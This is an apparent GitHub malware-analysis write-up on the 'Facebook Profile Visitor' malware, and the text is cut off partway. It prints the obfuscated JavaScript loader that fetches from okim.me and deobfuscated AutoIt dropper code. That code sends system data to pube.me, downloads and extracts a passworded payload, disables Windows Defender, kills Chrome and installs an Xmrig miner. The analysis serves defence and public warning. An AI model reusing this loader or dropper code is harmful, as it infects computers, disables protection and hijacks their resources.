# How Facebook Profile Visitor virus works?
## What is it?
<i>Facebook Profile Visitor</i> (Sometimes also called <i>Profile Visitor</i>) is a virus that has spread on Facebook (and Twitter) since 03/2020 until now.

## What does it do?
It mines coin (particularly Monero) using the tool Xmrig on your computer and stoles your Facebook account to spread the virus.

## Example?
![Vietnamese version of the virus](https://user-images.githubusercontent.com/68118236/145680558-47cabfdf-95be-4eae-b13b-7e7fc62a0a43.png)
<br>Vietnamese version of the virus that spread on Facebook, said "Hello, you can know who visited your profile with the Profile Visitor app"

## Some sandbox links
[VirusTotal](https://www.virustotal.com/gui/file/f479135d5db8e2f6dff59252b8e51ebd9414a226df908f994376415c20b9446d/detection)
[Any.run](https://app.any.run/tasks/c13f22e8-be22-4ea2-b350-a97efcfd948e)
[VMRay](https://www.vmray.com/analyses/89516baa335e/report/overview.html)

## How does it work?
<b>Be careful when clicking any of these links!!!</b>

### 1) The link in the Facebook post - how it spread
As you can see in the picture above, the post has the text said "Hello, you can know who visited your profile with the Profile Visitor app", and then the link, and then some pictures of people who visited the person who post's profile (I don't know if that is the real information or not).
<br> The link come in the form of `https://is.gd/` and then some id, for example `dZCN4W`. After some search I found that is.gd is an URL shortener service (but it might be built only for this purpose of spreading the virus onto Facebook)
<br> After clicking the link, it redirects you to the Google Storage API URL.

### 2) Google Storage API
Then you come to some links like `https://storage.googleapis.com/544707c173427ea279a99cbb1451cccb/913820487?ref=facebook&cid=b4a011cf-effb-fc9b-d533-ecc9323874a9&zip=ProfileVisitors%20v5.1.zip&exe=visitors.facebook.com`
<br> It is a REAL data stored on Google Storage on Google Cloud, and if you click view source, the following things comes:
```html

<!DOCTYPE html>
<html translate="no" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
    <script type="text/javascript">
      var bcddet = this;
var gxcei = [95,94,109,92,97,33,27,97,109,109,105,108,51,40,40,104,100,98,102,39,102,94,40,91,101,104,91,39,105,97,105,56,109,98,102,94,54,27,36,61,90,109,94,39,103,104,112,33,34,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,107,94,108,105,104,103,108,94,34,116,6,3,25,25,107,94,109,110,107,103,25,107,94,108,105,104,103,108,94,39,109,94,113,109,33,34,52,6,3,118,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,93,90,109,90,34,116,6,3,25,25,93,104,92,110,102,94,103,109,39,112,107,98,109,94,33,93,90,109,90,34,52,6,3,118,34,52];
var tvswn = "";
var rtpbo = 7;
var cvzkg = "length";
for(czzgv=0;czzgv<gxcei[cvzkg];czzgv++){
	var odygqq = "String";
	var unyrua = "fromCharCode";
	tvswn += bcddet[odygqq][unyrua](gxcei[czzgv]+rtpbo);
}
var bpvsum = "eval";
bcddet[bpvsum](tvswn);

    </script>
  </head>
  <body></body>
</html>
```
<br> You can also view the file `web.html` in this repo.
<br> The HTML code is mostly encoded in the array `gxcei`. This trick is often used to encode the source code that creator does not want clients to view. After cleaning and decoding, it becomes:
```html
<!DOCTYPE html>
<html translate="no" dir="ltr">
<head>
  <meta charset="utf-8">
  <title></title>
  <script type="text/javascript">
  var gxcei = [95,94,109,92,97,33,27,97,109,109,105,108,51,40,40,104,100,98,102,39,102,94,40,91,101,104,91,39,105,97,105,56,109,98,102,94,54,27,36,61,90,109,94,39,103,104,112,33,34,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,107,94,108,105,104,103,108,94,34,116,6,3,25,25,107,94,109,110,107,103,25,107,94,108,105,104,103,108,94,39,109,94,113,109,33,34,52,6,3,118,34,39,109,97,94,103,33,95,110,103,92,109,98,104,103,33,93,90,109,90,34,116,6,3,25,25,93,104,92,110,102,94,103,109,39,112,107,98,109,94,33,93,90,109,90,34,52,6,3,118,34,52];
  var tvswn = "";
  for(counter=0;counter<gxcei.length;counter++){
        tvswn += this.String.fromCharCode(gxcei[counter]+7);
  }
  this.eval(tvswn); // Execute the code

  </script>
</head>
<body>
</body>
</html>
```
<br> Please note that I have added some comments in the code.
<br>The array is decoded as the following Javascript code:
```javascript
fetch("https://okim.me/blob.php?time="+Date.now())
function(response)
{
	return response.text();
}
function(data)
{
	document.write(data);
};
```
<br> So it actually fetch another page, in this case `https://okim.me/blob.php?time=` followed by the current time. The page downloads a zip file into your computer.
<br>![The downloader](https://user-images.githubusercontent.com/68118236/145681336-c1cd118a-ca60-4af1-abd1-189b239f2935.png)
<br> Again, Vietnamese text said "758 download counts" and "The password is 3865". They actually use Google Translate API to translate this, the original things was in English.
<br> You can get the source of it if you want to, see `web` folder in this repo.
<br> <b>Again, some notes: The page sometimes might be blank when Cloudflare block the access of the client (I don't know why)</b>

### 3) The zip
After extract the zip with the provided password, it only has one file named `visitor.facebook.com`. It looks like an old 16-bit app, but actually it is an 64-bit app written in AutoIt scripting language. See VT for more information.
<br> In case you don't know, AutoIt is a interpreter language, which means it has to be phrased and executed at runtime. So, we can get the source code from it easily.
<br> Some notes: It shows that the exe is a 64-bit app, so it cannot run on the Windows x86 environment.

### 4) Decompile
<br> Refer to [VinCSS post](https://blog.vincss.net/2020/02/phuong-phap-trich-xuat-malicious-autoit-script.html), I decompiled it by:
<br> - Use the script below to convert the application to 32-bit app so Exe2Aut can decompile it:
```python
import sys

if len(sys.argv) != 3:
        print "Usage: python.exe autoit64to32.py <AutoItSC.bin> <sample>"
        sys.exit(1)
else:
        try:
                print 'Processing: ' + sys.argv[2]
                print '- Reading ' + sys.argv[1]
                autoitsc_content = open(sys.argv[1], 'rb').read()

                print '- Reading ' + sys.argv[2]
                sample_content  = open(sys.argv[2], 'rb').read()
                
                print '- Looking for the script'
                offset = sample_content.find(b'\xA3\x48\x4B\xBE\x98\x6C\x4A\xA9\x99\x4C\x53\x0A\x86\xD6\x48\x7D')
                if offset != -1:
                        print '- Script found at: 0x%x' % offset
                        sample_content = sample_content[offset:]

                        pe32_filename = sys.argv[2] + '.a32b.exe'
                        print '- Creating 32-bit version: ' + pe32_filename

                        open(pe32_filename, 'wb').write(autoitsc_content + sample_content)
                else:
                        print '- Script not found !'
        except Exception as e:
                print repr(e)
```
<br> - Decompile the source by drag it to Exe2Aut (You can download this online)
<br> - Get the source. The source code is protected by using the obfuscate technique, so it has 17678 lines!

### 5) De-obfuscate
<br> How? If you look at `fb.original.au3`, and scroll down at line 17334, there will be a call to the function `yuqcv()`:
![Main function](https://user-images.githubusercontent.com/68118236/145681966-32b605be-6e64-498d-a569-811e18ef7016.png)
<br> That is the main function! Why? If it is not, the call to the function must be inside another function. Also, all the file are all define of variables and functions, no actually executed code outside the function scope.
<br> Let take a look at it:
```autoit
Func yuqcv()
	$kkdygt = False
	For $i = $hxgunslnvoqp To $loptakx[apdpszx()]
		$jacjdnyx = $dftwmmefiev($uhqytcys($qojrpnaezkx), $loptakx[$i])
		If $jacjdnyx <> $fatiftckytkx Then
			$kkdygt = True
			ExitLoop
		EndIf
	Next
	If $kkdygt = False Then
		$tycocfgddh(nxlara($hauunuxlni & bbrfvej() & "" & ">(hu" & "" & cenlmetaefbs() & "" & scvbk() & $akneqgiits & $hhwbnd[91] & "" & $tsaabo))
		Exit
	Else
		Global $ifhbok = $bretzrnes(huslz("" & $xjxylhdbgpik))
		If $ifhbok = "" Then
			$ifhbok = robuh("" & "Um2" & "" & qbobehimrx())
		EndIf
		umwlcnpqy()
	EndIf
EndFunc
```
The variable `$kkdygt` is defined as False, `$hxgunslnvoqp` as `Local $hxgunslnvoqp = 331 / 331` so equal to 1, `apdpszx()` has the return of `Return 376 - 376` so equal to 0.
<br> But `$loptakx` is another story:
```autoit
$loptakx = $jtpebhivaeht(cxpclkhaarq("" & $wgakprflcmc & "" & $tgcbodidamzf & nebxzuhkbw() & "" & $hhwbnd[87] & "" & $hhwbnd[88] & "" & $hhwbnd[89] & "puV2d" & "" & $hhwbnd[90] & "" & "VB" & $cikmfzzgzvs & jeqcvmwvxxt() & gjyztaed() & "K" & xaheir() & $cnzvfbpz), mljbow("" & hcryswybbj()))
```
<br> `$jtpebhivaeht` is defined as `Execute`, `cxpclkhaarq` is the function `wanzeppkxbwu`:
```autoit
Func wanzeppkxbwu($jpoepgca)
	$qwyarxno = $hhwbnd[30] & "" & $eambenzcvdvn & "" & "t" & "" & $hhwbnd[31] & "" & $hhwbnd[32] & tfxpke() & "" & $hhwbnd[33] & $efsrh & dnvwvcjqt() & "" & sdrkqzqfrt() & "?g" & $edqmzgye & "" & $hhwbnd[34] & "" & $hhwbnd[35] & "N" & "" & "Vn" & "" & $hhwbnd[36] & "._" & "u#" & "" & $hhwbnd[37] & "" & $sbagzydue & $jzzfs & "" & $sngvqrwyrtnf & "" & ghneinwsczwn() & "a" & skjmysrcxuce() & "" & "&" & mgekiaoodq() & $yoqaxkf & $bwfzm & "" & $uuwqp & "" & $ahoipgdmonw & "" & "{0" & $xsqxreif & "" & "2" & "[" & "" & $ztagsubbllpf & ydkvqnum() & wnyebdjkkx() & "" & "GW)" & "" & hkdfwjeedtsk() & $sfiaun & "5]" & rxqwrwgdy() & "" & "f" & ybjzm() & $stgdo & "" & "<3" & "" & "m" & "" & "q" & ">" & kadnznhdlejk() & "8j" & $kbiqgxhyj & lpxty() & "" & bxglmgqytl() & "Z" & "" & $mrlijjcbr & "" & $hhwbnd[38] & "" & $hhwbnd[39]
	$wekfomhxyqf = $gevjrziwuj & liyimzhuyjb() & "" & "D" & "" & yjwrfhucd() & "=Y" & "Z)" & $eebpoy & xcrytctff() & jpleymguxhlq() & "" & mumrojklbr() & "g" & "" & $yxjywaja & "" & $hhwbnd[40] & "" & wexxtm() & $hhwbnd[41] & "" & $hhwbnd[42] & "" & "P" & nbfmdky() & "" & vgsnxik() & "o" & "" & $hhwbnd[43] & "" & $hhwbnd[44] & "v" & "e" & "." & "" & "0" & $copbkndbx & "" & $hhwbnd[45] & $hhwbnd[46] & "" & jtqmalf() & amgwihw() & $hhwbnd[47] & "" & twttad() & "" & "R&" & $hhwbnd[48] & "<" & "" & dzcaeo() & "K" & "" & $hhwbnd[49] & "" & "c" & "" & "+p" & $hhdgedvlvkl & tlgvjkdl() & "@" & qayvoyyp() & "" & mjopojtg() & ozirixnbzbmx() & sprlin() & $hmpexu & $mbljdmws & $hhwbnd[50] & "" & $hhwbnd[51] & "N" & "9" & $hhwbnd[52] & uhlldcg() & tjqlvowz() & "" & tcwieupeopr() & $hhwbnd[53] & "1" & "" & $hhwbnd[54] & $hhwbnd[55] & $uuocjrnuht & "" & $hhwbnd[56] & "" & tokwbfnli() & ":" & $hhwbnd[57]
	Local $tcmtaq = Execute($hhwbnd[58] & $hhwbnd[59] & "" & $hhwbnd[60] & hnrnueyd() & alabpxdb() & $qatcw & $hgdwcntsjcvo & guvuenf())
	Local $tpazve = Execute("" & "St" & "" & sxscidr() & $hpookkbivcrw & "" & phfdpuycr() & "" & "i" & "" & $hhwbnd[61])
	Local $mjquv = Execute(cxxudtshl() & "" & oqpfl() & "" & $nfbyopcmsbfj & qoklfhjskts() & $hhwbnd[62] & $hhwbnd[63])
	Local $bmroqxms
	$ibuiclergcj = $mjquv($jpoepgca)
	For $xwrvti = 0 + 0 To $ibuiclergcj
		$tejvw = $tpazve($jpoepgca, $xwrvti, $hhwbnd[27])
		$glopiobyw = $tcmtaq($qwyarxno, $tejvw, $hhwbnd[28])
		$rdganmja = $tpazve($wekfomhxyqf, $glopiobyw, $hhwbnd[29])
		$bmroqxms &= $rdganmja
	Next
	Return $bmroqxms
EndFunc
```
<br> I have wrote a Python script for this, basically replace the whole function `wanzeppkxbwu`. It do both work of variable replacer and decoder:
```python
# Decode the string in fb.au3

import sys

a = open(sys.argv[1], "r")
code = a.read().split("\n")
a.close()

d = [0, 500.0, 0.0, 200, 4, 5, 0, 2.0, 3, 0, 0, 1.0, 1, 0, 1, 2, 0, 0, 0.0, 0.0, 1.0, 2.0, 3, 4, 1, 0.0, 3, 1, 1, 1, '+', '-,', ': ', ';R', '\\', 'K', '^', 'E', '(', 'k', ' ', '^', '|M', 'n', 'a', 'XS', 'q', 'J', '}', '{', 'U', 'd', 'A', '_', '\\', '8T', 'k', '/', 'S', 't', 'r', 'd', 'e', 'n', '>', 'J', 'p>Mx', '}p', 'E', '#', 'g=#', 'J>K', 'Q', 'hu', '>p', 'J', 'p2', '^', '=t', 'J|', '5', 'p', 'K', '#', 'Tp?', '\\nE#', 'E', '>p', 'KVB', 'x$', 'E[', 'm', '?x>(', 'um', '^', '>*', '#', 'Lx2', '=#', 'C', '5u', '(=*', 'E', '#', '|6', ')w_hKpE', 'Qx', '#', '6>>2', 'p', 'C>', '\\S', '6', 'ug', 'H+', 'E', '>M$hC', '>', '*', '$', 'gp', 'S', 'C', '>', 'K', 'GS', 'ix', '<', 'O3wu', 'p*>3pE', 'KG', '+', '|Kx', '>M', '>', '}', 'u', '*p>', 'pC', 'p', 'g', '-H', '>M', '$p', 'G', 'h^', '+I', 'H', 'h', 'p', 'p', 'E', 'p', '$S', 'n', '2', '{PH', '*p', 'p', 'K', 'p', 'K', '*x', '5u', ' T', 'pa', '9', 'E$', '5#', '<>M', '>', 'L*', ' ', '>', '>9', '*', '9', 'p', '22kd', 'gx#T', '262', 'U?', '<>M', '*p', 'K', 'GS9#Lx', '$hC', 'L* T', 'x>p', '3{', '2', '=#', '*', '$', '}', 'J', 'p', 'p', 'p', '*', 'Z', 'ET', 'p', 'j', 'Cx', 'd', 'U', '#iE', '\\', 'EuE', '\\', '{', ' m', 'gw', 'm', 'w', 'e', 'i', 'Ku', 'd', '$', 'pCp#$', 'x>[', 'Ed', '>', 'p?p', 'dd', '6', 'phu', '[', '^Ku|', '*iEx>', 'hdu', 'x', '#', '$', '/', 'Kum', '|6Ku', 'z', 'p\\z', 'E|>#\\', 'p>', '2Ku', '>', '$E|', '#', '>\\Cx', 'p', '\\', '#(', 'J', 'd', 'dp>', 'j', 'Tp?', '\\zu', 'z', '\\', '(', '*', '#[\\z', '\\', '(', 'uK', '*', '$pd', 'p', "'m", '$p', '#[', 'p>4h', 'zE', '|>#\\', 'dA', '6', "$'m(", '#(7', '*', "pK*'", '$', '>', 'p', 'z', 'E', '|', "u#p'2($", '|', '6xd$', 'U', '[u#p', "'", '2', "p'm", 'j', '\\', 'u', '>\\', 'Cxdp\\z', '*', '>', '\\', 'K\\#', '(J', 'n', '}pgiKx', '}', 'p', 'd', '@', 'i)}', 't', 'uQ', '*', '9', 'pK', 'x|xp*', '*', 'Tp?p', 'h', '#>P', 'u#*', 'Tp', 'v', 'K', 'P', 'g', 'j', 'uC', 'u#j^', 'udx', '*jJ', '>', 'p', 'm', 'Ewd', 'Q', '*', '*', 'pK', 't', 'dp', '[Q', 'Kp', 'U', 'h', '9K', 'u', 'Kud', 'J', 'KBx|p', '*', 'EK', 'p', 'J>E#', 'w', 'd', 'pO', 'x', 'Edd', '3{', 'v', ':', 'p', 'udJ', 'K', '|p*', 'jJ', '*j', '^E', 'Emp', 'p', 'x', 'K', '$E', '^', 'dp', 'w', 'dp5', 'xCx', 'E', 'xu', 'J', 'M', 'Unjh9', 'u', '9', 'J', 'x|p', '|9', '3', 'p', 'j', 'QE', 'p', 'C>', 'j', 'i', 'u', 'pK', '#', 'Ji', '= ', 'U', 'J6', 'dd', 'U', 'p', 'z', 'u', 'z', 'dE', 'xu', 'x#', 'z', 'C', '4', '9>', '#', '#', '>Ku', '22tE', 'm', 'tx', 'u', 'I', '>', 'u2h', 'u', 'C>', '=', 'Y', '\\', 'jn', '|K', '>', '2', 'duK', 'W9x', 'E9', 'Y', 'O', '>', 'u', 'p', 'h', 'p', '>pJ', '6u', 'm', 'u#\\', 'dx#', 'Y', 'CpE>', 'u#>', 'p$\\z', '?', '>p', '#', 'x', 'u', 's.e', '2$E', '>p', 'e', 'p', '92$', '*', 'uC>Q', 'K', '2U', '*', 'p', 'KB', 'x|pT', 'p', 'hd', 'u', 'O', 'OxK*', 'O', 'pOx#$', 'K', '#g', 'x', '#g}pgU?2', 'f', 'r', '(', 'ljV', '/', '*H', 'x', 'p', 'C', 'jjjj/', 'R', 'GG/(fNjT', 'j', 'T', 'N', 'jk', '<', 'kj', 'jR', 'j', '6', 'kjj']

def decode_to_code(p):
    string1 = "+St-,: H;R=weX?gC\KNVn^._u#EBpTb/UsJahi9'&Dr}Fclz{0|12[yIQ6O@GW)x7$5]4fL*<3mq>A8joMPYdZv(k"
    string2 = ",'DB=YZ)>]Ib4#xgf r^|MP6jonave.0?EXSqCWu;J3*R&}<-K{c+py5@whFG(QOiUdN9A[zs$Hm2t_1\8TVkl7L:/"
    returnvalue = ""
    for i in range(0, len(p)):
        l = len(string1.split(p[i:i+1])[0])
        returnvalue += string2[l:l+1]
    return returnvalue

def decode_string(b, c, d):
    c = c.split(" & ")

    for i in range(0, len(c)):
        if '"' in c[i]:
            c[i] = c[i][1:-1]

    for i in range(0, len(c)):
        if ("$" in c[i]) and (not ("[" in c[i] and "]" in c[i])):
            for j in b:
                if (c[i] + " = ") in j:
                    c[i] = j.split(" = ")[1]

    for i in range(0, len(c)):
        if ("$hhwbnd[" in c[i]):
            c[i] = d[int(c[i].split("[")[1][:-1])]

    for i in range(0, len(c)):
        if ("(" in c[i]) and (")" in c[i]):
            name = c[i].split("()")[0]
            for j in range(0, len(b)):
                if ("Func " + name + "()") in b[j]:
                    for k in range(j+1, len(b)):
                        if "EndFunc" in b[k]:
                            c[i] = b[k-1].split(" ")[1]
                            break
                    break

    for i in range(0, len(c)):
        if '"' in c[i]:
            c[i] = c[i][1:-1]
    
    return decode_to_code(''.join(c))

while True:
    print("Enter the string you want to decode: ")
    i = input()
    print("The output is " + decode_string(code, i, d))
```
<br> In case you still want to know how the function looks like in AutoIt:
```autoit
Func wanzeppkxbwu($p)
	$string1 = "+St-,: H;R=weX?gC\KNVn^._u#EBpTb/UsJahi9'&Dr}Fclz{0|12[yIQ6O@GW)x7$5]4fL*<3mq>A8joMPYdZv(k"
	$string2 = ",'DB=YZ)>]Ib4#xgf r^|MP6jonave.0?EXSqCWu;J3*R&}<-K{c+py5@whFG(QOiUdN9A[zs$Hm2t_1\8TVkl7L:/"
	Local $returnvalue
	For $counter = 0 To StringLen($p)
		$returnvalue &= StringMid($string2, StringInStr($string1, StringMid($p, $counter, 1), 1), 1)
	Next
	Return $returnvalue
EndFunc
```
You can decode the whole file with it!

### 6) The function series
<br> Please note that the functions are spilted by the original virus maker or the decompiler, NOT by me. I can combine them into one, but I want to keep it separated.
#### a) 1st function: do some name check and get the active windows name
Back to the main function:
```autoit
Func yuqcv()
	$kkdygt = False
	For $i = $hxgunslnvoqp To $loptakx[apdpszx()]
		$jacjdnyx = $dftwmmefiev($uhqytcys($qojrpnaezkx), $loptakx[$i])
		If $jacjdnyx <> $fatiftckytkx Then
			$kkdygt = True
			ExitLoop
		EndIf
	Next
	If $kkdygt = False Then
		$tycocfgddh(nxlara($hauunuxlni & bbrfvej() & "" & ">(hu" & "" & cenlmetaefbs() & "" & scvbk() & $akneqgiits & $hhwbnd[91] & "" & $tsaabo))
		Exit
	Else
		Global $ifhbok = $bretzrnes(huslz("" & $xjxylhdbgpik))
		If $ifhbok = "" Then
			$ifhbok = robuh("" & "Um2" & "" & qbobehimrx())
		EndIf
		umwlcnpqy()
	EndIf
EndFunc
```
<br> It looks like when decoded (note that I have added some comments and some variables, also rename the variables and functions):
```autoit
$lsrlgh = StringSplit("Start|cmd.exe|Program Manager", "|")
$loptakx = StringSplit("updater|video|play|visitor|app", "|")

Func main() ; Main!!!!! - Check if vaild name
	$flag = False
	; This probably check if the name of the exe file is vaild, then decide to run
	For $i = 1 To $loptakx[0]
		$result = StringInStr(StringLower(@ScriptName), $loptakx[$i])
		If $result <> 0 Then
			$flag = True
			ExitLoop
		EndIf
	Next
	If $flag = False Then
		ConsoleWrite("ExitControlExeName") ; Wow, if the exe name is not vaild, then quit the program :)
										   ; I didn't know why the author do this? Maybe for checking
										   ; if the program is decompiled and then recompiled?
		Exit
	Else
		Global $wintitle = WinGetTitle("[ACTIVE]") ; Get current active windows / current focused windows to report later
		If $wintitle = "" Then
			$wintitle = "Empty" ;
		EndIf
		main2() ; Call main2
	EndIf
EndFunc
```
<br> Basically it check if the exe name is vailded, then decide to run or not. Also, it get the active window name, to report later
#### b) 2nd function: only allow one instance of the virus to run
<br> Function `main2` looks like:
```autoit
Func main2() ; Run only one instance
	$processpointer = ProcessList(@ScriptName) ; Get the current program process
	For $counter = 1 To $processpointer[0][0] ; Get number of instances of this process
		If $processpointer[$counter][1] <> @AutoItPid Then ; Get pid of processes and compare
			ConsoleWrite("ExitAlreadyRunning") ; Run the virus once
			Exit
		EndIf
	Next
	main3() ; Continue
EndFunc
```
<br> It only allows one instance of the virus to run
#### c) 3rd function: ping Google.com to check if internet available
<br> Now come to `main3`
```autoit
Func main3() ; Ping server
	$counter = 0
	While $counter = 0
		$counter = Ping("google.com") ; They ping google to check if network available :) - the old trick!
		Sleep(500)
	WEnd
	main4() ; Next!
EndFunc
```
<br> It Ping google to check if internet connection is available - the old trick
#### d) 4th function: Search for Windows Defender
<br> `main4`:
```autoit
Func main4() ; Search for Windows Defender
	Global $cghylztxnjb = ProcessExists("MsMpEng.exe") ; Searching for Windows Defender, and report to the server. See below
	main5()
EndFunc
```
<br> It checks if the process `MsMpEng.exe` available and report to the server. `MsMpEng.exe` is a part of Windows Defender.
#### e) 5th function: Check if the virus has activated before or not
<br> `main5`:
```autoit
Func main5()
	$vzmpkv = RegRead("HKCU\Software\Unzip", "Installed") ; Open registry key "HKCU\Software\Unzip" and read the value "Installed"
	Global $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
	If $vzmpkv = "Yes" Then ; Check key
		found_unzip() ; Found Unzip
	Else
		$vzmpkv = "No" 
		notfound_unzip() ; Not found
	EndIf
EndFunc
```
<br> The virus write to the `HKCU\Software\Unzip` key with the value `Installed` and `Trust` to check if the virus has been activated or not
<br> If the value `unzip` not found, it jump to the function `notfound_unzip`:
#### f) 5.1 function: Check the window title name
```autoit
Func notfound_unzip()
	For $i = 1 To $lsrlgh[0] ; StringSplit("Start|cmd.exe|ProgramManager", "|")
		If StringInStr($wintitle, $lsrlgh[$i]) <> 0 Then
			ConsoleWrite("Exit:IsBannedWindow")
			Exit
		EndIf
	Next
	found_unzip() ; Why jump?
EndFunc
```
<br> From what I understand, it check if the Title of the script has the string 'Start', 'cmd.exe' or 'ProgramManager'. If it has none of them, it exits. I think it's a check if the script is vailded or not.
<br> If `unzip` key is found, or if it passed the function `notfound_unzip`, it jump to the function `found_unzip`:
#### g) 5.2 function: Collect and submit data to server, get virus link
```autoit
Func found_unzip() ; Submit system information to server and get malaware from it!
	; Finally, http request!
	; Actually this function is from win32api
	; False means only one request, not multiple connections.
	
	; From what I saw here, they send some information of the system to the server.
	Global $httprequest = ObjCreate("winhttp.winhttprequest.5.1")
	$httprequest.Open("HEAD", "http://pube.me/app/login.php", False)
	$httprequest.setRequestHeader("User-Agent", "Unzip")
	$httprequest.setRequestHeader("Windows", $wintitle)
	$httprequest.setRequestHeader("ScriptName", @ScriptName)
	$httprequest.setRequestHeader("OS", @OSVersion)
	$httprequest.setRequestHeader("DefenderActive", ProcessExists("MsMpEng.exe"))
	$httprequest.setRequestHeader("CPU", "X64") ; I don't know why undefined. so default "X86". Originally @CPUArch
	$httprequest.setRequestHeader("Installed", $vzmpkv) ; Installed unzip or not?
	$httprequest.setRequestHeader("Version", 1) ; Don't know why it always be 1
	If RegRead("HKCU\Software\Unzip", "Trust") <> "No" Then ; Remember $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
		; If that program installed
		$httprequest.setRequestHeader("Trust", "No")
	EndIf
	$httprequest.Send() ; Send the request to server
	$requeststatus = $httprequest.Status ; Get request submit status
	If $requeststatus <> 200 Then ; Check if request sent or not, Http 200 code means succeeded
		ConsoleWrite("http://pube.me/app/login.php")
		ConsoleWrite("Response" & $requeststatus) ; Write the response code
		ConsoleWrite("Exit:GetConfig")
		Exit
	EndIf
	Global $sevenzipurl = $httprequest.GetResponseHeader("unzip")
	Global $virusurl = $httprequest.GetResponseHeader("zip") ; Get the file url to download
	main6($sevenzipurl, $virusurl) ; I have to pass as arguments since the keyword `Global` not work :(
EndFunc
```
<br> Note: for some reason the AutoIt version installed on my computer didn't recognise the macro `@CPUArch`, so I just replace it with `X64` because the executable is compiled only for X64.
<br> It send the `HEAD` request to the URL `http://pube.me/app/login.php`. This URL often got 1020 error by CloudFlare (still don't know why).
<br> Then it send the following infomations in the header:
|Name|Value|
|----|----|
|`User-Agent`|`Unzip`|
|`Windows`|The current active window title before you run the virus, for example `Blank Page - Internet Explorer` if you download and start the virus from it|
|`ScriptName`|The script name, in my case `visitor.facebook.com`|
|`OS`|Your Windows version, for example `WIN_10` if you are running Windows 10|
|`DefenderActive`|The current active status of your Windows Defender. `1` if active and `0` if not|
|`CPU`|Your CPU architecture. The executable is for x86_64 so it cannot be run on x86 cpu. I didn't check if it could run on ARM64 with x86_64 emulation or not|
|`Installed`|Whether the virus has activated or not, return `Yes` or `No`|
|`Version`|Always return `1`|
|`Trust`|Only send if the virus installed|

<br> Then it sent to the server and wait for the status. If the status is not 200 (Successful), it print the error and exit.
<br> If status is 200, the server will sent the `7-zip` extractor `7za.exe` and the virus archive `files.7z` download URL.
<br> I have run this and got the `7-zip` link in the form of `http://pube.me/app/7za.exe?id=somerandomnumberhere` and `files.7z` is `http://pube.me/app/files.7z?id=somerandomnumberhere` with `somerandomnumber` is a 4-digit number, but it doesn't matter.
#### h) 6th function: write to registry
```autoit
Func main6($sevenzipurl, $virusurl) ; Write Installed key
	; Alright, the virus write to the key unzip to check if it has already installed or not
	;RegWrite("HKCU\Software\Unzip", "Installed", "REG_SX[}q/q:OO=ZLb5o4g}m:Yes")
	main7($sevenzipurl, $virusurl)
EndFunc
```
<br> It now write to the registry to show that the virus has activated.
#### i) 7th function: prepare the virus directory
```autoit
Func main7($sevenzipurl, $virusurl) ; Create directory in appdata
	DirCreate($virusdir) ; Create the directory in AppData
	main8($sevenzipurl, $virusurl)
EndFunc
```
<br> It create a folder `C:\User\YOURUSERNAME\AppData\Roaming\YOURUSERNAME\`. If you install Windows to something isn't `C:`, find it in that drive!
#### k) 8th function: download the 7-zip extractor and the virus
```autoit
Func main8($sevenzipurl, $virusurl) ; Download 7-zip and virus
	If NOT FileExists($virusdir & "\7za.exe") Then ; Check if 7-zip available in that directory - to extract the virus
		InetGet($sevenzipurl, $virusdir & "\7za.exe", 1, 0) ; Download 7-zip, force reload mode (force redownload even if exist), download then continue (running in foreground)
	EndIf
	InetGet($virusurl, $virusdir & "\files.7z", 1,0) ; Download virus in the form of 7z archive and set a password so antiviruses cannot detect
	main9()
EndFunc
```
<br> It check if `7za.exe` available in that directory or not, if not then download it from the provided `$sevenzipurl`. After that, download the virus with the provided URL at `$virusurl`
#### l) 9th function: Extract the virus
```autoit
Func main9() ; Extract the virus
	RunWait($virusdir & "\" & "7za.exe e files.7z -aoa -pKEQZmgbrmDnTpa2b4DHVMX", $virusdir, @SW_HIDE) ; Extract the virus, the protected password is KEQZmgbrmDnTpa2b4DHVMX
	main10() ; This is when the malware get executed, so if you want to fetch the file only, please comment this line!!!
EndFunc
```
<br> It extracts the archive downloaded (`files.7z`) by using 7-zip console app. The password of the archive is `KEQZmgbrmDnTpa2b4DHVMX` - as you can see in the command line
<br> VirusTotal: [here](https://www.virustotal.com/gui/file/d6fccd97f041fb796963bf0b8566379eb1c53cfdd1409e6d39266e3deecf7321/detection). It won't be detected since the archive is protected by password.
<br> After extractions, it has the following files in the directory:
|File|Use|
|----|----|
|`background.js`|The background worker of the Chrome extension to load the JavaScript code from the server|
|`config.json`|The json config for Xmrig miner - in this case the `update-x64.exe`|
|`defender.exe`|Windows Defender disabler|
|`setacl.exe`|An open souce tool for changing security permission in Windows|
|`update-x64.exe`|Xmrig miner, but changed the icon and the infos|
|`update-x86.exe`|Also Xmrig, but the 32 bit version (I don't know why)|
|`WinRing0x64.sys`|To be loaded by Xmrig, `allow access to RDMSR, CPUID and RDTSC instructions` from Ring 3 in x86. This might be used by Xmrig to detect the hardware model to load the assembly accelerator|
#### m) 10th function: Kill Windows Defender
```autoit
Func main10() ; Kill Windows Defender
	If @OSVersion = "WIN_10" Then ; Check if the windows version is Windows 10 - maybe to find Windows Defender?
		Run($virusdir & "\" & "defender.exe /D", $virusdir, @SW_HIDE) ; Windows Defender disabler
		ProcessClose("SecurityHealthHost.exe") ; Kill it! Easy like that?
	EndIf
	main11()
EndFunc
```
<br> It kill Windows Defender with the `defender.exe` from `www.sordum.org`. This is a tool that people use to disable Windows Defender.
<br> You can view it on VirusTotal [here](https://www.virustotal.com/gui/file/ce3a6224dae98fdaa712cfa6495cb72349f333133dbfb339c9e90699cbe4e8e4/detection), on Any.run [here](https://app.any.run/tasks/5b8bc7d6-48c3-4dfc-af25-a5accae0a937/)
#### m) 11th function: copy itself to the created directory
```autoit
Func main11() ; Copy itself to virus directory
	FileCopy(@ScriptFullPath, $virusdir & "\app.exe", 1) ; Copy the current virus itself to the virus directory it created
	main12()
EndFunc
```
<br> It copy itself to the directory it has created, and rename to `app.exe`. In an infected machine, in that directory I didn't see `app.exe` for some reason.
#### n) 12th function: kill chrome
```autoit
Func main12() ; Kill Chrome
	While WinGetHandle(REGEXPTITLE:(?i)(.*Chrome.*)) ; Kill chrome by get the handle
		WinClose([REGEXPTITLE:(?i)(.*Chrome.*)])
	WEnd
	ProcessClose("chrome.exe")
	ProcessWaitClose("chrome.exe") ; Kill it to install the extension
	main13()
EndFunc
```
<br> Kill Chrome to install the malicious extension.
#### o) 13th function: set permision for the directory
```autoit
Func main13() ; Protect itself from being deleted
